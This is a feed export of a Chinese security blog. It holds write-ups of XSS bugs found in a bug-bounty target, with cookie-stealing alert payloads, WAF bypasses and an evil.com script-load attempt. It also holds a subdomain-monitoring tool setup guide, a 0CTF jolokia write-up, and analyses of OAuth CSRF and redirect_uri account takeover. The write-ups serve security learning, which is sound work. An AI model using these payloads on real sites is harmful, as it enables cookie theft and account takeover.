    <content type="html"><![CDATA[<p>原文首发于先知社区：<a href="https://xz.aliyun.com/t/4625" target="_blank" rel="noopener">https://xz.aliyun.com/t/4625</a></p><p>Author:Hpdoger@D0g3</p><p>最近试着去学挖洞，在测某SRC的一些业务时发现以下几个XSS的点。对于一些请求参数在返回的html中以隐蔽的标签形式出现的XSS，感觉还是挺常见的。这里我写了个Bp的插件用来监听请求并捕获这种情况:<a href="https://github.com/Hpd0ger/SuperTags" target="_blank" rel="noopener">SuperTags</a></p><p>下面的案例和讨论如果有什么片面或错误的地方，还望师傅们斧正</p><h1 id="登陆跳转处XSS"><a href="#登陆跳转处XSS" class="headerlink" title="登陆跳转处XSS"></a>登陆跳转处XSS</h1><p>某处登陆页面看了眼表单，同时跟进事件绑定的对象utils<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093334-a9875eec-5679-1.png" alt="image_1d6vk2rs4g541hq8olo1sf275i1g.png-83kB"></p><p>直接截出登陆验证部分，redata是响应参数，登陆成功为0。host定义为<strong>normal.com</strong>。这里发现其实在登陆的时候是可以存在一个cb参数的(但之前我登陆的时候并没有察觉，因为是后台有个功能loginout，点击才会附带cb参数到登录页)<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac41e300-5679-1.png" alt></p><p>其中,getparam方法如下</p><pre><code>getParam: function(c_name) {    var urlParams = location.href;    var c_start = urlParams.indexOf(c_name + &quot;=&quot;);銆€    if (c_start != -1) {        c_start = c_start + c_name.length + 1;銆€        c_end = urlParams.indexOf(&quot;&amp;&quot;, c_start);        if (c_end == -1) {            c_end = urlParams.length;        }        return urlParams.substring(c_start, c_end);    }else{        return null;    }},</code></pre><p>这里开发者还是对cb参数进行了意识形态的过滤，如果cb不包含host则强制重定向首页。但是略鸡肋，直接把host放在注释符后就能绕过。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac53408c-5679-1.png" alt="image_1d6vkg95e1vjv155m1s1n1c7oook3d.png-54.2kB"></p><p>POC：</p><pre><code>cb=javascript:alert(document.cookie);//normal.com</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac649418-5679-1.png" alt="image_1d6vko6a51n64961h1pcd370647.png-127.7kB"></p><h1 id="Image处的XSS"><a href="#Image处的XSS" class="headerlink" title="Image处的XSS"></a>Image处的XSS</h1><p>这是该厂商的一个移动端业务，在我测之前已经有表哥X进去了，看一下这个洞是如何产生的。</p><p>功能点:提交问题反馈，可以上传问题图片<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac846cde-5679-1.png" alt="image_1d6vivcc51p0mpm5hb61kgqti29.png-76.5kB"></p><p>漏洞逻辑：<br>上传图片-&gt;提交反馈-&gt;服务端拼接提交的img参数(uri)为img标签src属性的完整地址</p><p>测试上传一个图片后，点击提交反馈并抓包，<code>imglist</code>参数是刚才上传图片返回的uri地址。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-aca2a2bc-5679-1.png" alt="image_1d6vj4nch1a5p118b18ci1gu31olam.png-235.9kB"></p><pre><code>POST xxxx?q=index/feedback HTTP/1.1imglist=%2Cpicture%2F2019%2F02%2F22%2F_a948b4eeaca7420cad9d54fdb0331230.jpg&amp;</code></pre><p>问题就出在拼接标签这部分，修改imglist参数就可以闭合Src属性进行xss,使最终的img标签执行onerror事件</p><p>步骤：抓包修改img路径-&gt;拼接恶意js事件，POC：</p><pre><code>imglist=urlencode(&quot; onerror=&quot;alert(`XSS�`)&quot;&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-acc0b540-5679-1.png" alt></p><p>成功弹窗<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-accf7fa8-5679-1.png" alt="image_1d6vjv0dfkis172e1mkpd9b78c13.png-78kB"></p><h1 id="邮件提交处的XSS"><a href="#邮件提交处的XSS" class="headerlink" title="邮件提交处的XSS"></a>邮件提交处的XSS</h1><p>在测试某业务的邮箱密码验证时，发现一个包含请求邮箱的页面。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-acea5b84-5679-1.png" alt="image_1d6vf99vp1smijbq1q9pa1s1sfh2d.png-297.8kB"></p><p>记得之前看过一篇文章，有些服务在发送完邮件后会弹出一个“邮件已发送+email”的页面导致反射型XSS，感觉就是这种了。</p><p>随手测试了一下，发现直接waf了空格、双引号、尖括号，和”&quot;。实体了html编码的尖括号，但是没有实体html编码的双引号。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad08fdbe-5679-1.png" alt="image_1d6vf627h11u1ru6slc13uu1qqt1j.png-337.5kB"></p><p>同时在FUZZ的期间多次出现参数错误的请求，发现可能是应用层做了些过滤：</p><ol><li>email字符串长度&lt;40且@结尾</li><li>不能同时出现两个双引号、括号</li><li>正则alert(1)\prompt(1)\confim…</li></ol><p>不过只要脱离引号就好说，毕竟有很多JS事件可以调。一开始把眼光放在了input标签上测试了一些on事件，发现type是hidden，一些可视on事件都没用的。记得之前看过一个input hidden xss的一个用法是按alt+shift+x触发，poc如下</p><pre><code>urlencode(email=&amp;#34/accesskey=&amp;#34X&amp;#34/onclick=&amp;#34alert&amp;#40&#39;xss&#39;&amp;#41&amp;#34@qq.com)</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad17de9c-5679-1.png" alt="image_1d6vfebe9k0q1704vhff8u16cq2q.png-39kB"></p><p>但是这个poc很鸡肋。因为要打出cookie的话长度受限，且利用条件苛刻(firefox+按键)</p><p>回头看了下发现有form标签也有输出点，最初以为form能执行的JS事件就只有reset和submit，后来测试跑onmounseover也能弹框。</p><pre><code>encodeurl(email=&amp;#34/onmouseover=&amp;#34alert&amp;#40document.cookie&amp;#41&amp;#34@qq.com)</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad29e16e-5679-1.png" alt="image_1d71n2s5m1mnpvbslfj1iatkg99e.png-70.9kB"></p><h1 id="一个受阻的XSS"><a href="#一个受阻的XSS" class="headerlink" title="一个受阻的XSS"></a>一个受阻的XSS</h1><p>在测试某业务时发现一个有趣的参数拼接点：</p><p>iframe的src拼接url参数+后端给定的第三方host-&gt;iframe加载src</p><p>测试了一下特殊字符都给实体化了，但是又舍不得一个iframe<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad3e1f30-5679-1.png" alt="image_1d6vl16bn14i9ihun3ovnvnd4k.png-187.5kB"></p><p>经过一番寻找，发现第三方服务的登陆点存在JS跳转漏洞，用iframe加载这个第三方服务的dom-xss也能造成弹框效果<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad523f1a-5679-1.png" alt="image_1d6vleeqr1r4613u81e81cja1m3h5h.png-106.4kB"></p><p>虽然是在SRC业务站点弹的框，但真正的域应该是子页面的。打印一下COOKIE验证，果然是子页面域的cookie。由于waf掉了document.cookie和javascript:alert，我用了html编码的’:’和八进制js编码的’.’绕过，完整打印子页面域payload如下</p><pre><code>https://src.com?url=redirect_uri%3Djavascript%26%23x3A%3Bconsole.log(document\56cookie)</code></pre><p>在进一步的探索中，我做了两个尝试：</p><ol><li>尝试跳一个外域的JS，看能不能把src属性转到这个js<pre><code>https://src.com?url=redirect_uri%3Dhttps://evil.com/xss.js</code></pre>但是会把资源解析到子页面的document里，而不是src的改变<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad63994a-5679-1.png" alt="image_1d6vm2dvb1ls2185k1hof58miho5u.png-128.4kB"></li></ol><ol start="2"><li>iframe是否能调用父页面的事件呢(document)？如果可以的话我们就直接调js uri把cookie打出去。之所以有这个想法是因为，当时寻思既然站点调用这个三方服务了，很大可能性这个三方站是iframe-src白名单。不过测试后发现依然被跨域限制，测试payload<pre><code>https://src.com?url=redirect_uri%3Djavascript%26%23x3A%3Bconsole.log(window.parent.document\56cookie)</code></pre><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad6accec-5679-1.png" alt="image_1d6fi5odbg1pnb7nfdgs7ji6p.png-13.7kB"></li></ol><p>对跨域姿势了解的不多，如果有兴趣的师傅，可以一起来交流一下这种问题</p><h1 id="自闭总结"><a href="#自闭总结" class="headerlink" title="自闭总结"></a>自闭总结</h1><p>从打ctf到学着去挖洞，还是有一些思维出入的地方，慢慢理解之前师傅们说的资产收集的重要性。</p><p>也特别感谢引路人鬼麦子师傅给予的帮助，这里顺便推荐麦子师傅基于爬虫的一款开源子域名监控工具<a href="https://github.com/guimaizi/get_domain" target="_blank" rel="noopener">get_domain</a>，在搭建过程中如果遇到环境配置问题，可以参考这篇<a href="http://hpdoger.me/2019/03/30/Ubuntu16.04%E6%90%AD%E5%BB%BA%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9B%91%E6%8E%A7%E6%9C%8D%E5%8A%A1Get_domain/" target="_blank" rel="noopener">Ubuntu16.04-Get_domain搭建手册</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;原文首发于先知社区：&lt;a href=&quot;https://xz.aliyun.com/t/4625&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/4625&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Author:Hpdoger@D0
      
    
    </summary>
    
    
      <category term="论坛文章" scheme="https://hpdoger.cn/tags/%E8%AE%BA%E5%9D%9B%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu16.04-子域名监控工具Getdomain环境搭建</title>
    <link href="https://hpdoger.cn/2019/03/30/Ubuntu16.04%E6%90%AD%E5%BB%BA%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9B%91%E6%8E%A7%E6%9C%8D%E5%8A%A1Get_domain/"/>
    <id>https://hpdoger.cn/2019/03/30/Ubuntu16.04搭建子域名监控服务Get_domain/</id>
    <published>2019-03-29T16:00:00.000Z</published>
    <updated>2019-03-31T02:17:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ubuntu16-04-子域名监控Get-domain环境搭建"><a href="#Ubuntu16-04-子域名监控Get-domain环境搭建" class="headerlink" title="Ubuntu16.04-子域名监控Get_domain环境搭建"></a>Ubuntu16.04-子域名监控Get_domain环境搭建</h1><p>操作环境：Ubuntu16.04<br>数据库：Mongdb<br>项目地址：<a href="https://github.com/guimaizi/get_domain" target="_blank" rel="noopener">https://github.com/guimaizi/get_domain</a></p><h1 id="各种依赖安装"><a href="#各种依赖安装" class="headerlink" title="各种依赖安装"></a>各种依赖安装</h1><pre><code>sudo apt-get install git python3 python3-pip xvfb unzip libxss1 libappindicator1 libindicator7 -ysudo pip3 install selenium pymongo</code></pre><h1 id="安装mongodb服务端"><a href="#安装mongodb服务端" class="headerlink" title="安装mongodb服务端"></a>安装mongodb服务端</h1><ol><li>添加mongodb签名到APT<pre><code>sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv EA312927</code></pre></li><li>创建/etc/apt/sources.list.d/mongodb-org-3.2.list文件并写入命令<pre><code>echo &quot;deb http://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/3.2 multiverse&quot; | sudo tee /etc/apt/sources.list.d/mongodb-org-3.2.list</code></pre></li><li>更新软件源列表<pre><code>sudo apt-get update</code></pre></li><li>安装mongodb（默认是安装稳定版）<pre><code>sudo apt-get install -y mongodb-org</code></pre></li></ol><h1 id="配置mongodb服务端"><a href="#配置mongodb服务端" class="headerlink" title="配置mongodb服务端"></a>配置mongodb服务端</h1><ol><li><p>修改配置文件<code>/etc/mongodb.conf</code></p><pre><code>修改后的内容如下：bind_ip = 0.0.0.0port = 27017auth=true (添加帐号,密码认证)</code></pre><p>修改后重启mongodb:sudo service mongodb restart</p></li><li><p>添加超级用户</p><pre><code>use admindb.createUser({user:&#39;admin&#39;,pwd:&#39;123456aaa1xsda1A&#39;,roles:[{role:&#39;userAdminAnyDatabase&#39;,db:&#39;admin&#39;}]})db.auth(&#39;admin&#39;,&#39;123456aaa1xsda1A&#39;)</code></pre></li><li><p>添加扫描器用户</p><pre><code>use target_domaindb.createUser({user:&#39;target&#39;,pwd:&#39;123456aaaxsda1A&#39;,roles:[{role:&#39;readWrite&#39;,db:&#39;target_domain&#39;}]})db.auth(&#39;target&#39;,&#39;123456aaaxsda1A&#39;)</code></pre></li></ol><h1 id="安装chromedriver"><a href="#安装chromedriver" class="headerlink" title="安装chromedriver"></a>安装chromedriver</h1><p>先安装Chrome浏览器</p><pre><code>sudo apt-get install libxss1 libappindicator1 libindicator7wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.debsudo dpkg -i google-chrome*.debsudo apt-get install -f</code></pre><p>再安装chromedriver</p><pre><code>wget -N http://chromedriver.storage.googleapis.com/72.0.3626.7/chromedriver_linux64.zipunzip chromedriver_linux64.zipchmod +x chromedriversudo mv -f chromedriver /usr/local/share/chromedriversudo ln -s /usr/local/share/chromedriver /usr/local/bin/chromedriversudo ln -s /usr/local/share/chromedriver /usr/bin/chromedriver</code></pre><h1 id="安装go-lang"><a href="#安装go-lang" class="headerlink" title="安装go-lang"></a>安装go-lang</h1><pre><code>$ sudo apt-get update$ sudo apt-get -y upgrade$ wget https://storage.googleapis.com/golang/go1.7.linux-amd64.tar.gz$ sudo tar -xvf go1.7.linux-amd64.tar.gz$ sudo mv go /usr/local</code></pre><p>设置gopath</p><pre><code>vim /etc/profileexport GOROOT=/usr/local/go  #设置为go安装的路径，有些安装包会自动设置默认的gorootexport GOPATH=$HOME/gocode   #默认安装包的路径export PATH=$PATH:$GOROOT/bin:$GOPATH/binsource /etc/profile</code></pre><p>go env看一下是否设置成功</p><h1 id="设置Python默认为Python3"><a href="#设置Python默认为Python3" class="headerlink" title="设置Python默认为Python3"></a>设置Python默认为Python3</h1><p>文章：<a href="https://blog.csdn.net/u011534057/article/details/51615193" target="_blank" rel="noopener">https://blog.csdn.net/u011534057/article/details/51615193</a></p><p>使用文章的第二种方法：在系统级修改 Python 版本</p><h1 id="下载subfinder"><a href="#下载subfinder" class="headerlink" title="下载subfinder"></a>下载subfinder</h1><pre><code>go get github.com/subfinder/subfinder</code></pre><p>报错没关系，只要文件里有bin src就行</p><h1 id="后续步骤"><a href="#后续步骤" class="headerlink" title="后续步骤"></a>后续步骤</h1><p>见<a href="http://www.guimaizi.com/archives/360的启动说明" target="_blank" rel="noopener">http://www.guimaizi.com/archives/360的启动说明</a></p><p>crontab定时执行任务：<a href="https://www.jianshu.com/p/838db0269fd0" target="_blank" rel="noopener">https://www.jianshu.com/p/838db0269fd0</a></p><p>crontab文件如下，每天12点执行：</p><pre><code># everday 12:00 am exec0 0 17 * * ? python /home/get_domain/while_update.py</code></pre><p>注意最后要留个空行</p><h1 id="Mongodb操作"><a href="#Mongodb操作" class="headerlink" title="Mongodb操作"></a>Mongodb操作</h1><p>更新，否则无法进行对比，更新状态到0</p><pre><code>db.getCollection(&#39;xxx&#39;).update({&#39;state&#39;:1},{$set:{&#39;state&#39;: NumberInt(0)}},{multi:true})</code></pre><h1 id="一直运行random-start"><a href="#一直运行random-start" class="headerlink" title="一直运行random_start"></a>一直运行random_start</h1><pre><code>nohup python -u random_start.py &gt; nohup.log 2&gt;&amp;1 &amp;</code></pre><p>记得修改random_start的代码为while 1<br>可以修改五次config,运行五个后台程序</p><h1 id="各种报错解决"><a href="#各种报错解决" class="headerlink" title="各种报错解决"></a>各种报错解决</h1><h2 id="报错代码127"><a href="#报错代码127" class="headerlink" title="报错代码127"></a>报错代码127</h2><pre><code>selenium.common.exceptions.WebDriverException: Message: Service chromedriver unexpectedly exited. Status code was: 127</code></pre><p>原因是browser版本过低，跟driver不匹配，升级browser</p><pre><code>apt-get install chromium-browser</code></pre><h2 id="权限报错"><a href="#权限报错" class="headerlink" title="权限报错"></a>权限报错</h2><pre><code>selenium.common.exceptions.WebDriverException: Message: unknown error: Chrome failed to start: exited abnormall</code></pre><p>chromedriver在py程序里没权限，修改代码Browser.py</p><pre><code>chrome_options.add_argument(&#39;--headless&#39;)chrome_options.add_argument(&#39;--no-sandbox&#39;) </code></pre><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p>安装mongodb:<a href="https://www.jianshu.com/p/5598f1dcbb98" target="_blank" rel="noopener">https://www.jianshu.com/p/5598f1dcbb98</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Ubuntu16-04-子域名监控Get-domain环境搭建&quot;&gt;&lt;a href=&quot;#Ubuntu16-04-子域名监控Get-domain环境搭建&quot; class=&quot;headerlink&quot; title=&quot;Ubuntu16.04-子域名监控Get_domain环境搭
      
    
    </summary>
    
    
      <category term="漏洞挖掘" scheme="https://hpdoger.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>0CTF2019-Web1WriteUp</title>
    <link href="https://hpdoger.cn/2019/03/25/0CTF2019-Web1WriteUp/"/>
    <id>https://hpdoger.cn/2019/03/25/0CTF2019-Web1WriteUp/</id>
    <published>2019-03-24T16:00:00.000Z</published>
    <updated>2019-03-25T15:02:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0CTF-Web1"><a href="#0CTF-Web1" class="headerlink" title="0CTF Web1"></a>0CTF Web1</h1><p>第一次打0ctf，长见识了，各路神仙满天飞..</p><p>题目地址：<a href="http://111.186.63.207:31337" target="_blank" rel="noopener">http://111.186.63.207:31337</a></p><p>需要一个karaf认证，直接双写karaf<br><img src="http://static.zybuluo.com/1160307775/jjadmv0j4cbreq70dc6l9esd/image_1d6nu1vae155hklkc5e15c41ak99.png" alt="image_1d6nu1vae155hklkc5e15c41ak99.png-15.3kB"></p><p>当时组内师傅说有jolokia<br><img src="http://static.zybuluo.com/1160307775/vbmi61p7x4a5qmtsrsqodszt/image_1d6nu81co9hr1ac74nk2rs1n3um.png" alt="image_1d6nu81co9hr1ac74nk2rs1n3um.png-49.8kB"></p><p>去搜了一下jolokia的洞，看到了Lucifaer师傅的两篇分析文章<br><a href="https://lucifaer.com/2019/03/11/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%201/#0x05-poc%E6%9E%84%E9%80%A0" target="_blank" rel="noopener">https://lucifaer.com/2019/03/11/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%201/#0x05-poc%E6%9E%84%E9%80%A0</a></p><p><a href="https://lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/#0x04-%E6%9E%84%E9%80%A0poc" target="_blank" rel="noopener">https://lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/#0x04-%E6%9E%84%E9%80%A0poc</a></p><p>大致意思就是，执行器可以调用jolokia的list里类的函数来执行一些操作。可是搜了一下List没有logback可以用，但是题目里很明显提示有karaf，那么是否可以通过控制器的poc安装一个karaf控制台呢？所有karaf的时候有下面这个op</p><p><img src="http://static.zybuluo.com/1160307775/j1j2pt3lm0j8jtr9b63ehk7p/image_1d6qgq8tn1qaa1hhlbr2nl413s11m.png" alt="image_1d6qgq8tn1qaa1hhlbr2nl413s11m.png-7.2kB"></p><p><img src="http://static.zybuluo.com/1160307775/m7j4c61sux7w6ovgpox6e8ol/image_1d6qgok3kjq716kir4b1k1v6as9.png" alt="image_1d6qgok3kjq716kir4b1k1v6as9.png-12kB"></p><p>最终POC，利用luciafaer师傅的post数据包改造，mbean+op+args</p><p>注意content-type:applicatio/json，bp直接发包太坑了</p><p><img src="http://static.zybuluo.com/1160307775/nwnjcjdnn91n2qa6dpk35rvn/image_1d6num88ikml1pqe1jid1sln1kuh13.png" alt="image_1d6num88ikml1pqe1jid1sln1kuh13.png-111.6kB"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0CTF-Web1&quot;&gt;&lt;a href=&quot;#0CTF-Web1&quot; class=&quot;headerlink&quot; title=&quot;0CTF Web1&quot;&gt;&lt;/a&gt;0CTF Web1&lt;/h1&gt;&lt;p&gt;第一次打0ctf，长见识了，各路神仙满天飞..&lt;/p&gt;
&lt;p&gt;题目地址：&lt;a hre
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>对“绕过Facebook Token进行CSRF账号接管”的文章解读</title>
    <link href="https://hpdoger.cn/2019/02/18/%E6%B5%85%E8%B0%88%E7%BB%95%E8%BF%87Facebook%20Token%E8%BF%9B%E8%A1%8CCSRF%E8%B4%A6%E5%8F%B7%E6%8E%A5%E7%AE%A1/"/>
    <id>https://hpdoger.cn/2019/02/18/浅谈绕过Facebook Token进行CSRF账号接管/</id>
    <published>2019-02-17T16:00:00.000Z</published>
    <updated>2019-02-19T15:22:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="浅谈绕过Facebook-Token进行CSRF账号接管"><a href="#浅谈绕过Facebook-Token进行CSRF账号接管" class="headerlink" title="浅谈绕过Facebook Token进行CSRF账号接管"></a>浅谈绕过Facebook Token进行CSRF账号接管</h1><p>今天早上看到Sam大佬推特发了这篇文章，下午就见到先知上有译文了。为什么有译文了还要写这篇文章呢？安全圈的译文你懂的，大部分右键一把梭。</p><p>从文章本身来说，还是有比较值得学习的地方，所以摘出来流程分析一下。</p><p>原文：<a href="https://ysamm.com/?p=185" target="_blank" rel="noopener">https://ysamm.com/?p=185</a></p><p>先知译文: <a href="https://xz.aliyun.com/t/4089#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/4089#toc-5</a></p><h1 id="漏洞关键条件"><a href="#漏洞关键条件" class="headerlink" title="漏洞关键条件"></a>漏洞关键条件</h1><p>攻击者有一个oauth认证接口，即漏洞网站可以授权自己的网站</p><h1 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h1><p><img src="https://i.loli.net/2019/02/19/5c6c1ace4e4e3.jpg" alt></p><p>第二步，即location的Url如下</p><pre><code>https://www.facebook.com/comet/dialog_DONOTUSE/?url=/add_contactpoint/dialog/submit/%3fcontactpoint={EMAIL_CHOSEN}%26next=/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d{ATTACKER_APP}%2526redirect_uri%253d{DOUBLE_URL_ENCODED_LINK]</code></pre><p>next参数为<strong>下一步跳转参数</strong>，即邮箱绑定后跳转到<code>/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d{ATTACKER_APP}%2526redirect_uri%253d{DOUBLE_URL_ENCODED_LINK]</code>获取token再redirect到attacker web</p><h1 id="总结-修复思考"><a href="#总结-修复思考" class="headerlink" title="总结/修复思考"></a>总结/修复思考</h1><p>漏洞新颖的点就在授权后的跳转，这也算是一种突破oauth的新思路。利用信任站点的重定向进行其它oauth的绑定，再携带token二次重定向到attacker web。</p><p>如果能再二次重定向的地方加一个权限验证，即attacker app与oauth匹配，会不会避免这样的越权呢？</p><p>其次就是，如果我们省略三方授权，直接诱导用户点击第二步的location，不就更省事了么？这点我邮寄了sam师傅，希望日后有其它研究的师傅可以指点一下~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;浅谈绕过Facebook-Token进行CSRF账号接管&quot;&gt;&lt;a href=&quot;#浅谈绕过Facebook-Token进行CSRF账号接管&quot; class=&quot;headerlink&quot; title=&quot;浅谈绕过Facebook Token进行CSRF账号接管&quot;&gt;&lt;/a&gt;浅谈
      
    
    </summary>
    
    
      <category term="漏洞挖掘" scheme="https://hpdoger.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>Oauth2的两类漏洞挖掘</title>
    <link href="https://hpdoger.cn/2019/02/14/Oauth2%E7%9A%84%E4%B8%A4%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <id>https://hpdoger.cn/2019/02/14/Oauth2的两类漏洞挖掘/</id>
    <published>2019-02-13T16:00:00.000Z</published>
    <updated>2019-02-14T02:52:02.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Oauth2的两类漏洞挖掘"><a href="#Oauth2的两类漏洞挖掘" class="headerlink" title="Oauth2的两类漏洞挖掘"></a>Oauth2的两类漏洞挖掘</h1><p>一直忘了总结这个，结合OPPX的网站(无漏洞站点)说明一下</p><h2 id="redict-uri限制不严格-Oauth配置错误"><a href="#redict-uri限制不严格-Oauth配置错误" class="headerlink" title="redict_uri限制不严格(Oauth配置错误)"></a>redict_uri限制不严格(Oauth配置错误)</h2><h3 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h3><p>一般登陆选项是这样，常见的是QQ/微信/微博/…授权登陆<br><img src="https://i.loli.net/2019/02/14/5c64d712383f4.png" alt></p><p>点击QQ授权的时候请求包和返回包如下<br><img src="https://i.loli.net/2019/02/14/5c64d71326e9b.png" alt></p><p>request:</p><pre><code>POST /oauth2.0/authorize HTTP/1.1Host: graph.qq.comresponse_type=code&amp;client_id=100498628&amp;redirect_uri=https%3A%2F%2Fmy.oppo.com%2Fauth%2Fqqcallback&amp;scope=get_user_info%2Cadd_share%2Clist_album%2Cadd_album%2Cupload_pic%2Cadd_topic%2Cadd_one_blog%2Cadd_weibo%2Ccheck_page_fans%2Cadd_t%2Cadd_pic_t%2Cdel_t%2Cget_repost_list%2Cget_info%2Cget_other_info%2Cget_fanslist%2Cget_idolist%2Cadd_idol%2Cdel_idol%2Cget_tenpay_addr&amp;state=49085978f5e969063165246c6d07e062&amp;switch=&amp;from_ptlogin=1&amp;src=1&amp;update_auth=1&amp;openapi=80901010&amp;g_tk=1156350624&amp;auth_time=1550070856795&amp;ui=97557FF6-0331-4598-BC09-6CD21B7106E0</code></pre><p>response:</p><pre><code>HTTP/1.1 302 Moved TemporarilyServer: nginxDate: Wed, 13 Feb 2019 15:17:13 GMTContent-Type: text/htmlContent-Length: 0Connection: closeLocation: https://my.oppo.com/auth/qqcallback?code=5E0AA09C0CA8179C186688ABAF4BE043&amp;state=49085978f5e969063165246c6d07e062</code></pre><p>流程：请求graph.qq.com获得授权，拿到auth code后拼接到redirect_uri再请求，这点可以在返回包中的Location看到。</p><p>漏洞思路就是redict_uri限制不到位，严重的情况是没有限制域，一般情况是redict_uri可以到子域。QQ做了限制，拿cline_id和redirec_uri比对，不相符就返回False，如下<br><img src="https://i.loli.net/2019/02/14/5c64d712c68d7.png" alt></p><h3 id="案例-第三方帐号快捷登录授权劫持漏洞"><a href="#案例-第三方帐号快捷登录授权劫持漏洞" class="headerlink" title="案例-第三方帐号快捷登录授权劫持漏洞"></a>案例-第三方帐号快捷登录授权劫持漏洞</h3><p>修改redirect_uri到子域(一般是论坛站点，可以加载外域图片的地方，或者是可以XSS的地方)。location跳转到子域后访问我们外域地址，referer就携带了code。</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>KEY：<a href="https://gh0st.cn/archives/2018-02-12/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2018-02-12/1</a></p><h2 id="无state导致CSRF产生的账户接管"><a href="#无state导致CSRF产生的账户接管" class="headerlink" title="无state导致CSRF产生的账户接管"></a>无state导致CSRF产生的账户接管</h2><p>用户在第三方网站A上登录后，通过Authorization code方式的绑定流程。</p><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>拿绑定QQ为例子。</p><p>一般在登陆后的个人中心页面有绑定社交用户的功能，依然是请求greph.qq.com获取code，拼接到redirect_uri访问后完成绑定。如果没有state参数，用户在A登陆后进行，点击攻击者的redict_uri+code链接，就把用户A绑定在了攻击者的QQ上。可以看作是CSRF<br><img src="https://i.loli.net/2019/02/14/5c64d712f1b50.png" alt></p><h3 id="相关链接-1"><a href="#相关链接-1" class="headerlink" title="相关链接"></a>相关链接</h3><p>OAuth2.0忽略state参数引发的CSRF漏洞：<a href="https://blog.csdn.net/gjb724332682/article/details/54428808" target="_blank" rel="noopener">https://blog.csdn.net/gjb724332682/article/details/54428808</a></p><p>Oauth配置错误导致的账户接管：<a href="https://mp.weixin.qq.com/s/6lc6CHVjdXU1Zy4wWRIHzg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/6lc6CHVjdXU1Zy4wWRIHzg</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Oauth2的两类漏洞挖掘&quot;&gt;&lt;a href=&quot;#Oauth2的两类漏洞挖掘&quot; class=&quot;headerlink&quot; title=&quot;Oauth2的两类漏洞挖掘&quot;&gt;&lt;/a&gt;Oauth2的两类漏洞挖掘&lt;/h1&gt;&lt;p&gt;一直忘了总结这个，结合OPPX的网站(无漏洞站点)说
      
    
    </summary>
    
    
      <category term="漏洞挖掘" scheme="https://hpdoger.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>Echsop2.7.x几处漏洞分析</title>
    <link href="https://hpdoger.cn/2019/02/02/Echsop2.7.x%E5%87%A0%E5%A4%84%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://hpdoger.cn/2019/02/02/Echsop2.7.x几处漏洞分析/</id>
    <published>2019-02-01T16:00:00.000Z</published>
    <updated>2019-02-12T07:04:42.000Z</updated>
    
